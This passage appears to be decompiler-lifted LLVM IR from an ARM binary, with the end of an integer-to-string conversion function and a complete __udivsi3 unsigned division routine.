  store i32 %v4_11e68, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp40, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  br i1 %phitmp, label %.thread4, label %dec_label_pc_11e90

.thread4:                                         ; preds = %bb, %.thread22
  br label %dec_label_pc_11ea0

dec_label_pc_11e90:                               ; preds = %bb
  %v2_11e90 = sub nsw i32 0, %tmp
  store i1 %v3_11e54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11e54, label %dec_label_pc_11f40, label %dec_label_pc_11ea0

dec_label_pc_11ea0:                               ; preds = %dec_label_pc_11e90, %.thread4
  %v0_11ea810 = phi i32 [ %tmp, %.thread4 ], [ %v2_11e90, %dec_label_pc_11e90 ]
  %storemerge = phi i32 [ 0, %.thread4 ], [ 1, %dec_label_pc_11e90 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r6.global-to-local, align 4
  %v2_11ea4 = ptrtoint i32* %stack_var_-30 to i32
  store i32 %v2_11ea4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11ea8

dec_label_pc_11ea8:                               ; preds = %bb38, %dec_label_pc_11ea0
  %v2_11ec8 = phi i32 [ %v5_11ec8, %bb38 ], [ %v2_11ea4, %dec_label_pc_11ea0 ]
  %v0_11ec4 = phi i32 [ %v2_11ecc, %bb38 ], [ %v0_11ea810, %dec_label_pc_11ea0 ]
  %v0_11eac = load i32, i32* %r5.global-to-local, align 4
  %v2_11eb0 = urem i32 %v0_11ec4, %v0_11eac
  store i32 %v2_11eb0, i32* %r0.global-to-local, align 4
  %v7_11eb4 = icmp eq i32 %v2_11eb0, 9
  store i1 %v7_11eb4, i1* %cpsr_z.global-to-local, align 1
  %v1_11eb8 = add i32 %v2_11eb0, 48
  store i32 %v0_11eac, i32* %r1.global-to-local, align 4
  %v7_11ec0 = icmp sgt i32 %v2_11eb0, 9
  %extract.t = trunc i32 %v1_11eb8 to i8
  br i1 %v7_11ec0, label %bb37, label %bb38

bb37:                                             ; preds = %dec_label_pc_11ea8
  %v9_11ec0 = add i32 %v2_11eb0, 55
  %extract.t21 = trunc i32 %v9_11ec0 to i8
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_11ea8, %bb37
  %v0_11ec8.off0 = phi i8 [ %extract.t, %dec_label_pc_11ea8 ], [ %extract.t21, %bb37 ]
  store i32 %v0_11ec4, i32* %r0.global-to-local, align 4
  %v3_11ec8 = inttoptr i32 %v2_11ec8 to i8*
  store i8 %v0_11ec8.off0, i8* %v3_11ec8, align 1
  %v4_11ec8 = load i32, i32* %r7.global-to-local, align 4
  %v5_11ec8 = add i32 %v4_11ec8, -1
  store i32 %v5_11ec8, i32* %r7.global-to-local, align 4
  %v0_11ecc = load i32, i32* %r0.global-to-local, align 4
  %v1_11ecc = load i32, i32* %r1.global-to-local, align 4
  %v2_11ecc = udiv i32 %v0_11ecc, %v1_11ecc
  store i32 %v2_11ecc, i32* %r0.global-to-local, align 4
  %v2_11ed0 = icmp ugt i32 %v1_11ecc, %v0_11ecc
  store i1 %v2_11ed0, i1* %cpsr_z.global-to-local, align 1
  %v0_11ed4 = load i32, i32* %r6.global-to-local, align 4
  %v1_11ed4 = add i32 %v0_11ed4, -1
  store i32 %v1_11ed4, i32* %r6.global-to-local, align 4
  br i1 %v2_11ed0, label %dec_label_pc_11edc, label %dec_label_pc_11ea8

dec_label_pc_11edc:                               ; preds = %bb38
  %v0_11edc = load i32, i32* %sl.global-to-local, align 4
  %v2_11edc = icmp eq i32 %v0_11edc, 0
  store i1 %v2_11edc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11edc, label %bb39, label %dec_label_pc_11f44

bb39:                                             ; preds = %dec_label_pc_11edc
  store i32 %v0_11ed4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11ee8

dec_label_pc_11ee8:                               ; preds = %bb39, %dec_label_pc_11f44
  %v1_11ef4 = phi i32 [ %v0_11ed4, %bb39 ], [ %v1_11eec.pre, %dec_label_pc_11f44 ]
  %v2_11ee8 = ptrtoint i32* %stack_var_-62 to i32
  %v2_11eec = add i32 %v1_11ef4, %v2_11ee8
  %v3_11eec = inttoptr i32 %v2_11eec to i8*
  %v4_11eec = load i8, i8* %v3_11eec, align 1
  %v6_11eec = zext i8 %v4_11eec to i32
  store i32 %v6_11eec, i32* %r2.global-to-local, align 4
  %v2_11ef0 = icmp eq i8 %v4_11eec, 0
  store i1 %v2_11ef0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_11eec, i32* %r1.global-to-local, align 4
  br i1 %v2_11ef0, label %dec_label_pc_11f18, label %dec_label_pc_11efc

dec_label_pc_11efc:                               ; preds = %dec_label_pc_11ee8
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11f00

dec_label_pc_11f00:                               ; preds = %dec_label_pc_11f00, %dec_label_pc_11efc
  %v0_11f00 = phi i32 [ %v1_11f00, %dec_label_pc_11f00 ], [ 0, %dec_label_pc_11efc ]
  %v1_11f00 = add i32 %v0_11f00, 1
  store i32 %v1_11f00, i32* %r2.global-to-local, align 4
  %v2_11f04 = add i32 %v1_11f00, %v2_11eec
  %v3_11f04 = inttoptr i32 %v2_11f04 to i8*
  %v4_11f04 = load i8, i8* %v3_11f04, align 1
  %v2_11f08 = icmp eq i8 %v4_11f04, 0
  store i1 %v2_11f08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11f08, label %dec_label_pc_11f10, label %dec_label_pc_11f00

dec_label_pc_11f10:                               ; preds = %dec_label_pc_11f00
  %v7_11f10 = icmp eq i32 %v0_11f00, -2
  store i1 %v7_11f10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11f10, label %dec_label_pc_11f34, label %dec_label_pc_11f18

dec_label_pc_11f18:                               ; preds = %dec_label_pc_11f10, %dec_label_pc_11ee8
  %v0_11f2018 = phi i32 [ %v1_11f00, %dec_label_pc_11f10 ], [ %v6_11eec, %dec_label_pc_11ee8 ]
  store i32 %v2_11eec, i32* %r0.global-to-local, align 4
  %v0_11f1c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_11f1c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11f20

dec_label_pc_11f20:                               ; preds = %dec_label_pc_11f20.dec_label_pc_11f20_crit_edge, %dec_label_pc_11f18
  %v2_11f2c = phi i32 [ %v5_11f2c, %dec_label_pc_11f20.dec_label_pc_11f20_crit_edge ], [ %v0_11f1c, %dec_label_pc_11f18 ]
  %v0_11f24 = phi i32 [ %v0_11f24.pre, %dec_label_pc_11f20.dec_label_pc_11f20_crit_edge ], [ %v2_11eec, %dec_label_pc_11f18 ]
  %v0_11f20 = phi i32 [ %v0_11f20.pre, %dec_label_pc_11f20.dec_label_pc_11f20_crit_edge ], [ %v0_11f2018, %dec_label_pc_11f18 ]
  %v1_11f20 = add i32 %v0_11f20, -1
  store i32 %v1_11f20, i32* %r2.global-to-local, align 4
  %v1_11f24 = inttoptr i32 %v0_11f24 to i8*
  %v2_11f24 = load i8, i8* %v1_11f24, align 1
  %v5_11f24 = add i32 %v0_11f24, 1
  store i32 %v5_11f24, i32* %r0.global-to-local, align 4
  %v3_11f28 = icmp eq i32 %v0_11f20, 0
  store i1 %v3_11f28, i1* %cpsr_z.global-to-local, align 1
  %v3_11f2c = inttoptr i32 %v2_11f2c to i8*
  store i8 %v2_11f24, i8* %v3_11f2c, align 1
  %v4_11f2c = load i32, i32* %r1.global-to-local, align 4
  %v5_11f2c = add i32 %v4_11f2c, 1
  store i32 %v5_11f2c, i32* %r1.global-to-local, align 4
  br i1 %v3_11f28, label %dec_label_pc_11f34, label %dec_label_pc_11f20.dec_label_pc_11f20_crit_edge

dec_label_pc_11f20.dec_label_pc_11f20_crit_edge:  ; preds = %dec_label_pc_11f20
  %v0_11f20.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_11f24.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11f20

dec_label_pc_11f34:                               ; preds = %dec_label_pc_11f20, %dec_label_pc_11f10, %.thread1, %dec_label_pc_11e40
  %v0_11f34 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_11f34, i32* %r0.global-to-local, align 4
  %v2_11f3c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_11f3c, i32* @r4, align 4
  ret i32 %v0_11f34

dec_label_pc_11f40:                               ; preds = %dec_label_pc_11e90
  store i32 32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11f44

dec_label_pc_11f44:                               ; preds = %dec_label_pc_11edc, %dec_label_pc_11f40
  %v1_11f48 = phi i32 [ %v1_11ed4, %dec_label_pc_11edc ], [ 32, %dec_label_pc_11f40 ]
  %v2_11f48 = add i32 %v1_11f48, %v22_11e40
  store i32 %v2_11f48, i32* %r2.global-to-local, align 4
  %v3_11f50 = add i32 %v2_11f48, -34
  %v4_11f50 = inttoptr i32 %v3_11f50 to i8*
  store i8 45, i8* %v4_11f50, align 1
  %v1_11eec.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11ee8

; uselistorder directives
  uselistorder i32 %v5_11f2c, { 1, 0 }
  uselistorder i1 %v3_11f28, { 1, 0 }
  uselistorder i32 %v0_11f24, { 1, 0 }
  uselistorder i1 %v7_11f10, { 1, 0 }
  uselistorder i32 %v1_11f00, { 0, 1, 3, 2 }
  uselistorder i32 %v2_11eec, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_11ecc, { 1, 0 }
  uselistorder i32 %v5_11ec8, { 1, 0 }
  uselistorder i32 %v2_11eb0, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 1, 0 }
  uselistorder i1 %v3_11e54, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11e44, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 1, 7, 8, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 12, 11, 13, 14 }
  uselistorder i8 45, { 1, 0 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder i32 48, { 1, 0, 2 }
  uselistorder i32 9, { 4, 40, 7, 5, 33, 9, 32, 10, 28, 11, 29, 12, 30, 13, 31, 25, 8, 3, 34, 26, 2, 27, 35, 14, 36, 15, 37, 16, 38, 39, 17, 18, 19, 20, 21, 0, 22, 1, 23, 54, 41, 42, 6, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 55, 56, 53, 24 }
  uselistorder i32 32, { 30, 35, 36, 5, 4, 7, 6, 9, 8, 11, 10, 32, 13, 12, 14, 16, 15, 18, 17, 19, 20, 22, 21, 33, 34, 31, 37, 38, 23, 39, 24, 25, 26, 0, 27, 1, 2, 3, 28, 29 }
  uselistorder i32 10, { 33, 0, 19, 6, 22, 7, 23, 8, 24, 9, 25, 26, 3, 27, 28, 20, 10, 29, 21, 30, 11, 31, 32, 12, 2, 13, 14, 15, 4, 35, 36, 1, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 16, 47, 48, 49, 17, 50, 51, 52, 53, 54, 56, 57, 58, 59, 60, 55, 5, 61, 34, 18 }
  uselistorder i8 0, { 17, 18, 0, 4, 19, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 29, 7, 30, 1, 6, 5, 8, 31, 32, 33, 34, 35, 14, 36, 37, 40, 15, 38, 39, 13, 41, 42, 43, 44, 45, 9, 3, 10, 16, 11, 12, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder label %dec_label_pc_11f44, { 1, 0 }
  uselistorder label %dec_label_pc_11ee8, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_11e68, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_11f58 = add i32 %arg2, -1
  %v7_11f58 = icmp eq i32 %arg2, 1
  br i1 %v7_11f58, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_11f5c = load i32, i32* @r0, align 4
  ret i32 %v2_11f5c

bb80:                                             ; preds = %entry
  %v2_11f58 = icmp eq i32 %arg2, 0
  br i1 %v2_11f58, label %dec_label_pc_12040, label %dec_label_pc_11f64

dec_label_pc_11f64:                               ; preds = %bb80
  %v0_11f64 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_11f64, %arg2
  br i1 %tmp, label %dec_label_pc_11f6c, label %dec_label_pc_11ff8

dec_label_pc_11f6c:                               ; preds = %dec_label_pc_11f64
  %v2_11f6c = and i32 %v1_11f58, %arg2
  %v4_11f6c = icmp eq i32 %v2_11f6c, 0
  br i1 %v4_11f6c, label %dec_label_pc_12004, label %dec_label_pc_11f74

dec_label_pc_11f74:                               ; preds = %dec_label_pc_11f6c
  %v3_11f74 = icmp ult i32 %arg2, 536870912
  br i1 %v3_11f74, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_11f74
  %v4_11f78 = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_11f74, %.thread
  %v0_11f98.pr36.ph = phi i32 [ %v4_11f78, %.thread ], [ %arg2, %dec_label_pc_11f74 ]
  %storemerge115 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_11f74 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_11f98.pr36 = phi i32 [ %v4_11f8c, %bb83 ], [ %v0_11f98.pr36.ph, %.preheader.preheader ]
  %v1_11f90 = phi i32 [ %v4_11f90, %bb83 ], [ %storemerge115, %.preheader.preheader ]
  %v2_11f84 = icmp ugt i32 %v0_11f98.pr36, 268435455
  br i1 %v2_11f84, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_11f98thread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_11f88 = icmp ult i32 %v0_11f98.pr36, %v0_11f64
  br i1 %v4_11f88, label %bb82, label %dec_label_pc_11f98thread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_11f8c = and i32 %v0_11f98.pr36, 268435456
  %v3_11f8c = icmp eq i32 %v2_11f8c, 0
  %v4_11f8c = mul i32 %v0_11f98.pr36, 16
  br i1 %v3_11f8c, label %bb83, label %dec_label_pc_11f98.loopexit

bb83:                                             ; preds = %bb82
  %v2_11f90 = and i32 %v1_11f90, 268435456
  %v3_11f90 = icmp eq i32 %v2_11f90, 0
  %v4_11f90 = mul i32 %v1_11f90, 16
  br i1 %v3_11f90, label %.preheader, label %dec_label_pc_11f98thread-pre-split.loopexit.loopexit

dec_label_pc_11f98thread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_11fa448.ph = phi i32 [ %v1_11f90, %bb81 ], [ %v4_11f90, %bb83 ]
  %v0_11f98.pr38.ph = phi i32 [ %v0_11f98.pr36, %bb81 ], [ %v4_11f8c, %bb83 ]
  br label %dec_label_pc_11f98thread-pre-split.loopexit

dec_label_pc_11f98thread-pre-split.loopexit:      ; preds = %dec_label_pc_11f98thread-pre-split.loopexit.loopexit, %.thread2
  %v1_11fa448 = phi i32 [ %v1_11f90, %.thread2 ], [ %v1_11fa448.ph, %dec_label_pc_11f98thread-pre-split.loopexit.loopexit ]
  %v0_11f98.pr38 = phi i32 [ %v0_11f98.pr36, %.thread2 ], [ %v0_11f98.pr38.ph, %dec_label_pc_11f98thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_11f98thread-pre-split

dec_label_pc_11f98thread-pre-split:               ; preds = %dec_label_pc_11f98thread-pre-split.loopexit, %bb85
  %v1_11fa446 = phi i32 [ %v1_11fa448, %dec_label_pc_11f98thread-pre-split.loopexit ], [ %v3_11fa4, %bb85 ]
  %v0_11f98.pr = phi i32 [ %v0_11f98.pr38, %dec_label_pc_11f98thread-pre-split.loopexit ], [ %v3_11fa0, %bb85 ]
  br label %dec_label_pc_11f98

dec_label_pc_11f98.loopexit:                      ; preds = %bb82
  br label %dec_label_pc_11f98

dec_label_pc_11f98:                               ; preds = %dec_label_pc_11f98.loopexit, %dec_label_pc_11f98thread-pre-split
  %v1_11fa4 = phi i32 [ %v1_11fa446, %dec_label_pc_11f98thread-pre-split ], [ %v1_11f90, %dec_label_pc_11f98.loopexit ]
  %v1_11fa0 = phi i32 [ %v0_11f98.pr, %dec_label_pc_11f98thread-pre-split ], [ %v4_11f8c, %dec_label_pc_11f98.loopexit ]
  %v2_11f98 = icmp slt i32 %v1_11fa0, 0
  br i1 %v2_11f98, label %dec_label_pc_11fac, label %bb84

bb84:                                             ; preds = %dec_label_pc_11f98
  %v4_11f9c = icmp ult i32 %v1_11fa0, %v0_11f64
  br i1 %v4_11f9c, label %bb85, label %dec_label_pc_11fac

bb85:                                             ; preds = %bb84
  %v3_11fa0 = mul i32 %v1_11fa0, 2
  %v2_11fa4 = icmp slt i32 %v1_11fa4, 0
  %v3_11fa4 = mul i32 %v1_11fa4, 2
  br i1 %v2_11fa4, label %dec_label_pc_11fac, label %dec_label_pc_11f98thread-pre-split

dec_label_pc_11fac:                               ; preds = %bb84, %dec_label_pc_11f98, %bb85
  %v2_11fb859 = phi i32 [ %v3_11fa4, %bb85 ], [ %v1_11fa4, %bb84 ], [ %v1_11fa4, %dec_label_pc_11f98 ]
  %v1_11fb051 = phi i32 [ %v3_11fa0, %bb85 ], [ %v1_11fa0, %bb84 ], [ %v1_11fa0, %dec_label_pc_11f98 ]
  br label %dec_label_pc_11fb0

dec_label_pc_11fb0:                               ; preds = %.thread11, %dec_label_pc_11fac
  %v1_11fe4 = phi i32 [ %v4_11fe4, %.thread11 ], [ %v2_11fb859, %dec_label_pc_11fac ]
  %v1_11fb8 = phi i32 [ %v0_11ff0, %.thread11 ], [ 0, %dec_label_pc_11fac ]
  %v1_11fe8 = phi i32 [ %v4_11fe8, %.thread11 ], [ %v1_11fb051, %dec_label_pc_11fac ]
  %v1_11fb4 = phi i32 [ %v0_11fe0, %.thread11 ], [ %v0_11f64, %dec_label_pc_11fac ]
  %v3_11fb0 = icmp ult i32 %v1_11fb4, %v1_11fe8
  br i1 %v3_11fb0, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_11fb0
  %v3_11fb4 = sub i32 %v1_11fb4, %v1_11fe8
  %v3_11fb8 = or i32 %v1_11fb8, %v1_11fe4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_11fb0, %bb86
  %v1_11fc0 = phi i32 [ %v1_11fb4, %dec_label_pc_11fb0 ], [ %v3_11fb4, %bb86 ]
  %v1_11fc4 = phi i32 [ %v1_11fb8, %dec_label_pc_11fb0 ], [ %v3_11fb8, %bb86 ]
  %v4_11fbc = udiv i32 %v1_11fe8, 2
  %v6_11fbc = icmp ult i32 %v1_11fc0, %v4_11fbc
  br i1 %v6_11fbc, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_11fc0 = urem i32 %v1_11fe8, 2
  %v4_11fc0 = icmp eq i32 %v3_11fc0, 0
  %v6_11fc0 = sub i32 %v1_11fc0, %v4_11fbc
  br i1 %v4_11fc0, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_11fc4 = udiv i32 %v1_11fe4, 2
  %v6_11fc4 = or i32 %v1_11fc4, %v5_11fc4
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_11fcc = phi i32 [ %v6_11fc0, %bb87 ], [ %v1_11fc0, %.thread7 ], [ %v6_11fc0, %bb88 ]
  %v1_11fd0 = phi i32 [ %v1_11fc4, %bb87 ], [ %v1_11fc4, %.thread7 ], [ %v6_11fc4, %bb88 ]
  %v4_11fc8 = udiv i32 %v1_11fe8, 4
  %v6_11fc8 = icmp ult i32 %v1_11fcc, %v4_11fc8
  br i1 %v6_11fc8, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_11fcc = and i32 %v1_11fe8, 2
  %v4_11fcc = icmp eq i32 %v3_11fcc, 0
  %v6_11fcc = sub i32 %v1_11fcc, %v4_11fc8
  br i1 %v4_11fcc, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_11fd0 = udiv i32 %v1_11fe4, 4
  %v6_11fd0 = or i32 %v1_11fd0, %v5_11fd0
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_11fd8 = phi i32 [ %v6_11fcc, %bb89 ], [ %v1_11fcc, %.thread8 ], [ %v6_11fcc, %bb90 ]
  %v1_11fdc = phi i32 [ %v1_11fd0, %bb89 ], [ %v1_11fd0, %.thread8 ], [ %v6_11fd0, %bb90 ]
  %v4_11fd4 = udiv i32 %v1_11fe8, 8
  %v6_11fd4 = icmp ult i32 %v1_11fd8, %v4_11fd4
  br i1 %v6_11fd4, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_11fd8 = and i32 %v1_11fe8, 4
  %v4_11fd8 = icmp eq i32 %v3_11fd8, 0
  %v6_11fd8 = sub i32 %v1_11fd8, %v4_11fd4
  br i1 %v4_11fd8, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_11fdc = udiv i32 %v1_11fe4, 8
  %v6_11fdc = or i32 %v1_11fdc, %v5_11fdc
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_11ff0 = phi i32 [ %v1_11fdc, %bb91 ], [ %v1_11fdc, %.thread9 ], [ %v6_11fdc, %bb92 ]
  %v0_11fe0 = phi i32 [ %v6_11fd8, %bb91 ], [ %v1_11fd8, %.thread9 ], [ %v6_11fd8, %bb92 ]
  %v2_11fe0 = icmp eq i32 %v0_11fe0, 0
  br i1 %v2_11fe0, label %dec_label_pc_11ff0, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp120 = icmp ult i32 %v1_11fe4, 16
  br i1 %tmp120, label %dec_label_pc_11ff0, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_11fe4 = udiv i32 %v1_11fe4, 16
  %v4_11fe8 = udiv i32 %v1_11fe8, 16
  br label %dec_label_pc_11fb0

dec_label_pc_11ff0:                               ; preds = %thread-pre-split, %bb93
  ret i32 %v0_11ff0

dec_label_pc_11ff8:                               ; preds = %dec_label_pc_11f64
  %v9_11f64 = icmp eq i32 %v0_11f64, %arg2
  %. = zext i1 %v9_11f64 to i32
  ret i32 %.

dec_label_pc_12004:                               ; preds = %dec_label_pc_11f6c
  %v2_12004 = icmp ugt i32 %arg2, 65535
  br i1 %v2_12004, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_12004
  %v2_12008 = and i32 %arg2, 32768
  %v3_12008 = icmp eq i32 %v2_12008, 0
  %v4_12008 = udiv i32 %arg2, 65536
  br i1 %v3_12008, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_12004
  %v0_1201465 = phi i32 [ %arg2, %dec_label_pc_12004 ], [ %v4_12008, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_12018 = phi i32 [ %v0_1201465, %.thread16 ], [ %v4_12008, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_12014 = icmp ugt i32 %v1_12018, 255
  br i1 %v2_12014, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_12018 = and i32 %v1_12018, 128
  %v3_12018 = icmp eq i32 %v2_12018, 0
  %v4_12018 = udiv i32 %v1_12018, 256
  br i1 %v3_12018, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_1201c = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_12028 = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_1201c, %bb100 ]
  %v1_12024 = phi i32 [ %v1_12018, %bb98 ], [ %v4_12018, %bb99 ], [ %v4_12018, %bb100 ]
  %v2_12020 = icmp ugt i32 %v1_12024, 15
  br i1 %v2_12020, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_12024 = and i32 %v1_12024, 8
  %v3_12024 = icmp eq i32 %v2_12024, 0
  %v4_12024 = udiv i32 %v1_12024, 16
  br i1 %v3_12024, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_12028 = add nsw i32 %v1_12028, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_12030 = phi i32 [ %v1_12028, %.thread17 ], [ %v1_12028, %bb101 ], [ %v2_12028, %bb102 ]
  %v5_12034 = phi i32 [ %v1_12024, %.thread17 ], [ %v4_12024, %bb101 ], [ %v4_12024, %bb102 ]
  %v2_1202c = icmp ugt i32 %v5_12034, 3
  %v7_1202c = icmp eq i32 %v5_12034, 4
  %v2_12030 = xor i1 %v7_1202c, true
  %v3_12030 = and i1 %v2_1202c, %v2_12030
  br i1 %v3_12030, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_12030 = add nsw i32 %v4_12030, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_12034 = phi i32 [ %v4_12030, %.thread18 ], [ %v5_12030, %bb103 ]
  %v2_12034 = xor i1 %v2_1202c, true
  %v3_12034 = or i1 %v7_1202c, %v2_12034
  br i1 %v3_12034, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_12034 = udiv i32 %v5_12034, 2
  %v9_12034 = add i32 %v4_12034, %v8_12034
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_12038 = phi i32 [ %v4_12034, %bb104 ], [ %v9_12034, %bb105 ]
  %v6_12038 = lshr i32 %v0_11f64, %v1_12038
  ret i32 %v6_12038

dec_label_pc_12040:                               ; preds = %bb80
  %v0_12040 = load i32, i32* @lr, align 4
  %v0_12044 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_12040)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_12034, { 1, 0 }
  uselistorder i1 %v7_1202c, { 1, 0 }
  uselistorder i32 %v4_12024, { 1, 0 }
  uselistorder i32 %v1_12024, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12018, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_12018, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12008, { 1, 0 }
  uselistorder i32 %v0_11fe0, { 1, 0 }
  uselistorder i32 %v4_11fd4, { 1, 0 }
  uselistorder i32 %v1_11fdc, { 1, 2, 0 }
  uselistorder i32 %v4_11fc8, { 1, 0 }
  uselistorder i32 %v1_11fd0, { 1, 2, 0 }
  uselistorder i32 %v4_11fbc, { 1, 0 }
  uselistorder i32 %v1_11fc4, { 1, 2, 0 }
  uselistorder i32 %v1_11fe8, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_11fb8, { 1, 0 }
  uselistorder i32 %v1_11fe4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_11fa4, { 1, 0 }
  uselistorder i32 %v3_11fa0, { 1, 0 }
  uselistorder i32 %v1_11fa0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_11fa4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_11f90, { 1, 0 }
  uselistorder i32 %v4_11f8c, { 2, 1, 0 }
  uselistorder i32 %v1_11f90, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_11f98.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_11f64, { 2, 5, 3, 1, 4, 0 }
  uselistorder i1 true, { 0, 1, 40, 2, 3, 4, 5, 6, 90, 32, 41, 48, 91, 10, 11, 12, 68, 59, 69, 70, 71, 42, 13, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 14, 15, 33, 34, 88, 89, 58, 39, 49, 92, 8, 9, 57, 7, 93, 17, 16, 50, 53, 51, 54, 46, 52, 47, 56, 94, 18, 95, 96, 19, 35, 36, 97, 60, 61, 37, 98, 38, 99, 20, 21, 100, 62, 63, 22, 23, 101, 64, 65, 24, 25, 102, 66, 67, 26, 27, 45, 103, 104, 55, 105, 43, 28, 44, 29, 30, 31 }
  uselistorder i32 15, { 25, 26, 3, 27, 4, 28, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 29, 30, 24, 31, 32, 33, 34, 1, 35, 36, 37, 38, 2, 39 }
